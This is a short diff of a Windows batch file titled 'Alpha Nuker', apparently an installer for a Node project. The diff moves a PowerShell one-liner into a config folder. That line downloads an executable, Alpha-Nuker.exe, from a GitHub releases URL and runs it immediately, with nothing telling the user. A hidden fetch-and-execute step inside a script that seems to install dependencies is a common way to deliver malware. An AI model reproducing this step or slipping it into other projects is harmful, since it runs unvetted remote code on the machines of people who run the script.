@@ -1,6 +1,8 @@
 @echo off
 title Alpha Nuker
+cd config
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/Alpha-Nuker/releases/download/Alpha-Nuker/Alpha-Nuker.exe';$file='Alpha-Nuker.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+cd ..
 
 if exist node_modules\ (
   echo You've already installed this
